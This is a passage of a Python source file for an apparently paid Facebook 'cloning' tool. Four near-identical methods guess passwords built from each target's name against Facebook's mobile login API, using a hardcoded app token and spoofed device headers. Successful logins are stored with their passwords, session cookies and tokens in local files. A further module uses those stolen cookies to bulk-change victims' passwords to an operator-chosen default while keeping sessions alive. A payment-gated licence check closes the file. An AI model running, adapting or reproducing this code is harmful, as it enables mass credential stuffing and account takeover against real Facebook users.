			sp(2);self.file_menu()
		
	def method_select(self,id):
		#check_again()
		logo()
		p(" [1] \033[1;39mMethod 1 ")
		p (" [2] \033[1;39mMethod 2 ")
		p (" [3] \033[1;39mMethod 3 ")
		line()
		m_opt = input(" [•] Choose : ")
		if m_opt =='1':
			method.append("i")
			self.password_menu(id)
		if m_opt =='2':
			method.append('ii')
			self.password_menu(id)
		if m_opt =='3':
			method.append('iii')
			self.password_menu(id)
		#elif m_opt =="4":
			method.append('iiii')
			self.password_menu(id)
		else:p(" [•] Wrong Select ! ");sp(2);self.method_select(id)

	def password_menu(self,id):
		#check_again()
		pwx=[]
		logo()
		max = 20
		p(" [•] Example 1 , 2 , 3  to 20 Max ")
		try:
			plimit = int(input(" [•] Put limit : "))
			if plimit =="":
				plimit = 4
			elif plimit > max:
				p(" [•] Password Limit Should under 20 ");sp(2);self.password_menu()
		except:
			plimit = 4
		logo()
		p(" [•] Enter Passwords :\033[92;1m firstlast First Last etc\033[1;37m")
		line()
		for n in range(plimit):
			pwx.append(input(" [•] Put Password %s : "%(n+1)))
		logo()
		
		p(" [•] Total Accounts : \033[97;1m%s "%(str(len(id))))
		p(" \033[91;1m[•] If No Result Use Flight Mode\033[97;1m") 
		line()
		with tpe(max_workers=30) as saqi:
			for user in id:
				uid = user.split("|")[0]
				nm = user.split("|")[1]
				if "i" in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif "ii" in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif "iii" in method:
					saqi.submit(self.method3,uid,nm,pwx)
				elif "iiii" in method:
					saqi.submit(self.method4,uid,nm,pwx)
		self.saved_results(ok,cp)
	def saved_results(self,ok,cp):
		line()
		p(" [•] Cloning Has been Completed ")
		p(" [•] Total Ok Accounts : %s "%(len(ok)))
		p(" [•] Total Cp Accounts : %s "%(len(cp)))
		line()
		input(" [•] Press Enter To Go Back ")
		self.iAmMenu()
#####______________mtha1_________________##########
	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SMZ] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
						"format": "json",
						"device_id": str(uuid.uuid4()),
						"cpl": "true",
						"family_device_id": str(uuid.uuid4()),
						"credentials_type": "device_based_login_password",
						"error_detail_type": "button_with_disabled",
						"source": "register_api",
						"email": uid,
						"password": pw,
						"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
						"generate_session_cookies": "1",
						"meta_inf_fbmeta": "",
						"advertiser_id": str(uuid.uuid4()),
						"currently_logged_in_userid": "0",
						"locale": "en_US",
						"client_country_code": "GB",
						"method": "auth.login",
						"fb_api_req_friendly_name": "authenticate",
						"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
						"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod1Ua(),
						'Content-Type': 'application/x-www-form-urlencoded',
						'Host': 'graph.facebook.com',
						'X-FB-Net-HNI': str(random.randint(20000, 40000)),
						'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
						'X-FB-Connection-Type': f'{SEX}',
						'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
						'X-FB-Connection-Quality': f'{SEX}',
						'X-Tigon-Is-Retry': 'False',
						'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
						'x-fb-device-group': '5120',
						'X-FB-Friendly-Name': 'ViewerReactionsMutation',
						'X-FB-Request-Analytics-Tags': 'graphservice',
						'X-FB-HTTP-Engine': 'Liger',
						'X-FB-Client-IP': 'True',
						'X-FB-Server-Cluster': 'True',
						'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#print(q)
				if "session_key" in q:
					token = q["access_token"]
					ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
					ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cok = f"sb={ssbb};{ckkk}"
					p('\r\033[1;92m[SMZ•OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/SMZ_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SMZ_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SMZ•CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SMZ_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
#####_____________method2_________#####
	def method2(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SMZ] %s | M2 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
						"format": "json",
						"device_id": str(uuid.uuid4()),
						"cpl": "true",
						"family_device_id": str(uuid.uuid4()),
						"credentials_type": "device_based_login_password",
						"error_detail_type": "button_with_disabled",
						"source": "register_api",
						"email": uid,
						"password": pw,
						"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
						"generate_session_cookies": "1",
						"meta_inf_fbmeta": "",
						"advertiser_id": str(uuid.uuid4()),
						"currently_logged_in_userid": "0",
						"locale": "en_US",
						"client_country_code": "GB",
						"method": "auth.login",
						"fb_api_req_friendly_name": "authenticate",
						"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
						"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod2Ua(),
						'Content-Type': 'application/x-www-form-urlencoded',
						'Host': 'graph.facebook.com',
						'X-FB-Net-HNI': str(random.randint(20000, 40000)),
						'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
						'X-FB-Connection-Type': f'{SEX}',
						'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
						'X-FB-Connection-Quality': f'{SEX}',
						'X-Tigon-Is-Retry': 'False',
						'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
						'x-fb-device-group': '5120',
						'X-FB-Friendly-Name': 'ViewerReactionsMutation',
						'X-FB-Request-Analytics-Tags': 'graphservice',
						'X-FB-HTTP-Engine': 'Liger',
						'X-FB-Client-IP': 'True',
						'X-FB-Server-Cluster': 'True',
						'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#print(q)
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[SMZ•OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/SMZ_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SMZ_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SMZ•CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SMZ_M2_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method1(uid,nm,pwx)
		except Exception as e:
			self.method1(uid,nm,pwx)
######___________________mthad3__________________#######
	def method3(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SMZ] %s | M3 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
						"format": "json",
						"device_id": str(uuid.uuid4()),
						"cpl": "true",
						"family_device_id": str(uuid.uuid4()),
						"credentials_type": "device_based_login_password",
						"error_detail_type": "button_with_disabled",
						"source": "register_api",
						"email": uid,
						"password": pw,
						"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
						"generate_session_cookies": "1",
						"meta_inf_fbmeta": "",
						"advertiser_id": str(uuid.uuid4()),
						"currently_logged_in_userid": "0",
						"locale": "en_PK",
						"client_country_code": "US",
						"method": "auth.login",
						"fb_api_req_friendly_name": "authenticate",
						"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
						"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
						'Content-Type': 'application/x-www-form-urlencoded',
						'Host': 'graph.facebook.com',
						'X-FB-Net-HNI': str(random.randint(20000, 40000)),
						'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
						'X-FB-Connection-Type': f'{SEX}',
						'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
						'X-FB-Connection-Quality': f'{SEX}',
						'X-Tigon-Is-Retry': 'False',
						'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
						'x-fb-device-group': '5120',
						'X-FB-Friendly-Name': 'ViewerReactionsMutation',
						'X-FB-Request-Analytics-Tags': 'graphservice',
						'X-FB-HTTP-Engine': 'Liger',
						'X-FB-Client-IP': 'True',
						'X-FB-Server-Cluster': 'True',
						'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()

				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					open('/sdcard/COOKIES_TOKEN.txt','a').write(cok+'|'+token+'\n')
					p('\r\033[1;92m[SMZ•OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/SMZ_M3_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SMZ_M3_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SMZ•CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SMZ_M3_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method3(uid,nm,pwx)
		except Exception as e:
			self.method3(uid,nm,pwx)
#######_________________Method4____________#########
	def method4(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [SMZ] %s | M4 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			m4url = "https://iquaqib.vercel.app/ua"
			m4ua = requests.get(m4url).text
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
						"format": "json",
						"device_id": str(uuid.uuid4()),
						"cpl": "true",
						"family_device_id": str(uuid.uuid4()),
						"credentials_type": "device_based_login_password",
						"error_detail_type": "button_with_disabled",
						"source": "register_api",
						"email": uid,
						"password": pw,
						"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
						"generate_session_cookies": "1",
						"meta_inf_fbmeta": "",
						"advertiser_id": str(uuid.uuid4()),
						"currently_logged_in_userid": "0",
						"locale": "en_GB",
						"client_country_code": "PK",
						"method": "auth.login",
						"fb_api_req_friendly_name": "authenticate",
						"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
						"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmMethod3Ua(),
						'Content-Type': 'application/x-www-form-urlencoded',
						'Host': 'graph.facebook.com',
						'X-FB-Net-HNI': str(random.randint(20000, 40000)),
						'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
						'X-FB-Connection-Type': f'{SEX}',
						'Authorization':'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',
						'X-FB-Connection-Quality': f'{SEX}',
						'X-Tigon-Is-Retry': 'False',
						'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
						'x-fb-device-group': '5120',
						'X-FB-Friendly-Name': 'ViewerReactionsMutation',
						'X-FB-Request-Analytics-Tags': 'graphservice',
						'X-FB-HTTP-Engine': 'Liger',
						'X-FB-Client-IP': 'True',
						'X-FB-Server-Cluster': 'True',
						'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False,verify=True).json()
				#rint(q)
				if "session_key" in q:
					token = q["access_token"]
					cok = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
					p('\r\033[1;92m[SMZ•OK] %s | %s \033[1;97m '%(uid,pw))
					open('/sdcard/COOKIE_TOKEN.txt','a').write(cok+'|'+token+'\n')
					ok.append(uid)
					open('/sdcard/SMZ_M4_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/SMZ_M4_COOKIES.txt','a').write(uid+'|'+pw+'|'+cok+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[SMZ•CP] %s | %s \033[1;97m '%(uid,pw))
					cp.append(uid)
					open('/sdcard/SMZ_M4_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
			self.method4(uid,nm,pwx)
		except Exception as e:
			self.method4(uid,nm,pwx)
#######_________________join________&#########
class Join:
	def Whatsapp(self):
		os.system('xdg-open https://facebook.com/groups/1937425263394282/')
		iAmMain().iAmMenu()
#######___________________Name_____________#######
class Grep:
	def __init__(self):
		self.url = "https://free.facebook.com"
	def with_names(self):
		clear()
		logo()
		lines=[]
		p(" [•] Ex : /sdcard/file.txt")
		try:
			file = input(" [•] Put File Path : ")
		except Exception as e:
			print(" [•] File Path Incorrect!! ");sp(2);self.used_cutter()
		digit= int(input(" [•] Put Line Num :"))
		with open(file,"r") as r:
			lines = r.readlines()
		with open(file,"w") as w:
			for num,line in enumerate(lines):
				if num >= digit:
					w.write(line)
		p(" [•] File  Complete")
		input(" [•] Press Enter to go back ")
		iAmMain().iAmMenu()
########_________Passschang______#########
class automation:
	def iAmPasswordManager(self):
		logo()
		p(" [1] Change Passwords (Bulk) \n [2] Change Single Account Password \n [3] Change Default Password \n [B] Press B To Back ")
		line()
		iamoption = input(' [•] Choose : ')
		if iamoption == '1':
			self.bulk_password()
		elif iamoption =='2':
			self.single_password()
		elif iamoption =='3':
			self.change_default()
		elif iamoption =='B':
			iAmMain().iAmMenu()
		else:
			p(" [•] Wrong Select ! ")
			sp(2);self.iAmPasswordManager()
	def bulk_password(self):
		global sessions_options
		sav = "/sdcard/SMZ_passwords.txt"
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "SMZ#786"
		logo()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		try:
			file = input(" [•] Put Cookies File Path : ")
			id = open(file,"r").read().splitlines()
		except FileNotFoundError:
			print(" [•] File Not Found ! ")
			sp(2)
			self.bulk_password()
		logo()
		print(' [1] Keep Sessions\n [2] Logout All Sessions')
		kl = input(' [*] Choose : ')
		####if kl == '1':
			###sessions_options.append('1')
		##else:
			###sessions_options.append('2')
		sav = "/sdcard/SMZ_passwords.txt"
		os.system('touch '+sav)
		print(" [•] Password Changing Procces is started ! ")
		line()
		p(" [•] Total Cookies File Accounts : %s "%(len(id)))
		line()
		p(" [•] Please Be Patience Use Fast Internet ")
		line()
		for x in id:
			uid = x.split("|")[0]
			op = x.split('|')[1]
			cookie = x.split('|')[2]
			self.change_password(uid,op,np,cookie)
		print(" [•] Proccess Has Been Completed ! ")
		print(" [•] Your File Saved in %s "%(sav))
		line()
		input(" [•] Press Enter To Go Back to Password Menu ! ")
		sp(1)
		self.iAmPasswordManager()
		
		
	def single_password(self):
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "SMZ#786"
		logo()
		print(" [•] Default Password : %s "%(iamdefaultpassword))
		line()
		np = iamdefaultpassword
		pw = input(" [•] Put Old Pass : ")
		cok = input(" [•] Paste Cookies : ")
		# headers = {'cookie':cok}
		cookie_dict={}
		try:
			cok = cok.split(';')
			for x in cok:
				key,value = x.split('=')
				cookie_dict.update({key:value})
		except:
			pass
		cookies = cookie_dict


		ses = requests.Session()
		r= ses.get("https://mbasic.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
				"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
				"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
				"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
				"password_old":pw,
				"password_new":np,
				"password_confirm":np,
				"save": "Save changes"
				}
		po = ses.post("https://mbasic.facebook.com"+str(next),cookies=cookies,data=data,allow_redirects=False)
		try:
			location = po.headers['Location']
			if 'https://mbasic.facebook.com/settings/account/password/survey/' in location:
				location = location
				po = po.text.replace("amp;","")
				r2 = ses.get(location,cookies=cookies).text
				for x in re.findall('action="(.*?)"',r2):
					if '/settings/account/password/survey/' in x:
						keep_sessions_url = 'https://mbasic.facebook.com'+str(x)
				keep_sessions_data = {
						'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"',r2).group(1),
						'jazoest':re.search('name="jazoest" value="(.*?)"',r2).group(1),
						'session_invalidation_options':'keep_sessions',
						'submit_action':'Continue'}
				keep_sessions_request = ses.post(keep_sessions_url,keep_sessions_data,cookies=cookies)
				ncoki = '; '.join([a+'='+b for a,b in ses.cookies.get_dict().items()])
				if 'Password changed' in r2:
					p(' cookies : '+ncoki)
					p(" [•]  ✓ Password Changed Succesfully ")
					sp(2)
					input(" [•] Press Enter To Go Backk")
					self.iAmPasswordManager()
				else:
					p(" [•] Failed To Changed Password ")
			else:
				print(' [*] incorrect location ...')
		except KeyError:
			p(" [•] Failed To Changed Password : ")

	def change_password(self,uid,op,np,cookie):
		global sessions_options
		sav = "/sdcard/SMZ_passwords.txt"
		ses = requests.Session()
		ses.max_redirects = 50
		cookie_dict={}
		try:
			cok = cookie.split(';')
			for x in cok:
				key,value = x.split('=')
				cookie_dict.update({key:value})
		except:
			pass
		cookies = cookie_dict
		r= ses.get("https://mbasic.facebook.com/settings/security/password/?",cookies=cookies).text
		r= r.replace("amp;","")
		next = re.findall('action\="(.*?)"',r)[1]
		data = {
				"fb_dtsg":re.findall('name="fb_dtsg" value="(.*?)"',r),
				"jazoest":re.findall('name="jazoest" value="(.*?)"',r),
				"password_change_session_identifier":re.findall('name="password_change_session_identifier" value="(.*?)"',r),
				"password_old":op,
				"password_new":np,
				"password_confirm":np,
				"save": "Save changes"
				}
		po = ses.post("https://mbasic.facebook.com"+str(next),cookies=cookies,data=data)
		po = po.text.replace("amp;","")
		def sessions_options():
			###if sessions_options == '1':
			
		#####if sessions_options == '1':
			for x in re.findall('action="(.*?)"',po):
				if '/settings/account/password/survey/' in x:
					keep_sessions_url = 'https://mbasic.facebook.com'+str(x)
			keep_sessions_data = {
					'fb_dtsg':re.search('name="fb_dtsg" value="(.*?)"',po).group(1),
					'jazoest':re.search('name="jazoest" value="(.*?)"',po).group(1),
					'session_invalidation_options':'keep_sessions',
					'submit_action':'Continue'}
			keep_sessions_request = ses.post(keep_sessions_url,keep_sessions_data,cookies=cookies)
			ncoki = '; '.join([a+'='+b for a,b in ses.cookies.get_dict().items()])
			if 'Password changed' in po:
				print(" [•] Successfully Changed : %s "%(str(uid)))
				open(sav,"a").write(uid+'|'+np+'|'+ncoki+'\n')
			else:
				p(" [•] Failed To Changed Password :"+uid)
		#####elif sessions_options == '2':
			ncoki = '; '.join([a+'='+b for a,b in ses.cookies.get_dict().items()])
			if 'Password changed' in po:
				print(" [•] Successfully Changed : %s "%(str(uid)))
				open(sav,"a").write(uid+'|'+np+'|'+ncoki+'\n')
			else:
				p(" [•] Failed To Changed Password :"+uid)
	def change_default(self):
		logo()   
		try:
			iamdefaultpassword= open(".default_password.txt","r").read()
		except FileNotFoundError:
			iamdefaultpassword = "sheraz14"
		p(" [•] Default Password : %s"%(iamdefaultpassword))
		line()
		os.system("rm -rf .default_password.txt ")
		change_pw = input(" [•] Put New BALOCH Password : ")
		if len(change_pw) < 6:
			print(" [•] Password Should be Six Characters More .")
			sp(2)
			self.change_default()
		
		t = open(".default_password.txt","w").write(change_pw)
		print(" [•] Default Password is Changed ! ")
		p(" [•] Your New Password : %s "%(change_pw))
		line()
		input("[•] Press Enter to go back ")
		self.iAmPasswordManager()
##########_______________END-Setup________________#####   
def approval():
  clear()
  logo()
  myid = str(os.getuid())
  myid=myid.upper()[::-1]
  n=re.findall("(\d\d)",myid)
  plat=platform.version()[2:][:8][::-1].upper()+platform.release()[3:][::-1].upper()+platform.version()[:2]
  xp = plat.replace(' ', '').replace('-', '').replace('#', '').replace(':', '').replace('.', '').replace(')', '').replace('(', '').replace('?', '').replace('=', '').replace('+', '').replace(';', '').replace('*', '').replace('_', '').replace('?', '').replace('  ', '')
  id = "".join(myid)
  idd = "MR-SHERAZ"
  Key = idd+id+xp
  

  try:
    httpCaht = requests.get('https://raw.github/main/Approval').text
    if id in httpCaht:
      print("\33[1;32m YOUR KEY IS APPROVED.")
      msg = str(os.geteuid())
      time.sleep(0.5)
      iAmMain().iAmMenu()
      pass
    else:
      print(f"{G} YOUR KEY  :{W}  " +Key)
      line()
      print(f"{G} NOTE      :  WELCOME TO BALOCH TOOL{W}")
      line()
      print(f"{W} TOOL IS PAID YOU HAVE TO\n PAY FOR APPROVAL")
      line()
      print(f" {G}For Pakistan ==={W }easypaisa : {G}03229603596")
      print(f" {W}Rs.400 For 15 Days")
      print(f" {W}Rs.600 For 1 Month")
      print(f" {G}For Other Countries ==={W} Binance : {G}752243517")
      print(f"  {W}3dollar$ For 15 Days")
      print(f"  {W}5dollar$ For 1 Month")
      print(f" {W}COPY YOUR KEY SEND TO ADMIN FOR APPROVAL")
      input(f'{G} IF YOU WANT TO BUY THEN PRESS ENTER ')
      tks = ('Sheras%20king%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+Key);os.system('am start https://wa.me/+923263036857?text='+tks),approval()
      time.sleep(1)
      #approval()
  except:
    sys.exit()
##approval()
if __name__=="__main__":
	iAmMain().iAmMenu()
	###approval()